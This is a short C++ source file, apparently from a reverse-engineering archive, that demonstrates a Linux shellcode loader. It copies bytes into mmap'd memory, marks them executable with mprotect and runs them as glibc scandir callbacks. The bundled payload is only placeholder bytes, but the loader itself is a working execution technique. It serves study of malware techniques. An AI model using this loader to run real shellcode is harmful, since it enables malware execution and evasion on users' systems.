/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing glibc function to run shellcode as callback.

Compile:
    $ g++ code.cpp

Technique:
    - allocation: mmap
    - writing:    memcpy
    - permission: mprotect
    - execution:  scandir
*/

#include <sys/mman.h>
#include <dirent.h>
#include <string.h>
#include <stdint.h>

typedef int (*cb_filter_t)(const struct dirent *);
typedef int (*cb_compare_t)(const struct dirent **, const struct dirent **);

int main ()
{
    void *      runtime;
    int         retval;
    dirent **   result;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = mmap (0, payload_len, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    // copy payload to the buffer
    memcpy (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = mprotect (runtime, payload_len, PROT_READ|PROT_EXEC);

    if (retval == 0)
    {
        /*
        This example will use shellcode as both callback.
        However we can use any callback as the only callback.
        */
        scandir(".", &result, (cb_filter_t) runtime, (cb_compare_t) runtime);
    }

    // dealocate memory map
    munmap (runtime, payload_len);

    return 0;
}